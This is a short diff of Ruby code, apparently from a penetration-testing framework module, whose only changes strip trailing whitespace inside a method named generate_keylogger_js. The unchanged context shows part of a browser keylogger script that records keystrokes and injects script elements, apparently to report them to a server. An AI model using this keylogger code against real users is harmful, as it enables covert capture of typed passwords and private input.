@@ -232,7 +232,7 @@ EOS
 	def generate_keylogger_js(base_url, cid)
 
 		targ = Rex::Text.rand_text_alpha(12)
-	
+
 		code = <<EOS
 
 var c#{@seed} = 0;
@@ -267,12 +267,12 @@ function d#{@seed}(e){
 
 function #{@seed}(k#{@seed}){
 	l#{@seed} = l#{@seed} + k#{@seed} + ",";
-		
+
 	var t#{@seed} = "#{targ}" + c#{@seed};
 	c#{@seed}++;
-	
+
 	var f#{@seed};
-	
+
 	if (document.all)
 		f#{@seed} = document.createElement("<script name='" + t#{@seed} + "' id='" + t#{@seed} + "'></script>");
 	else {
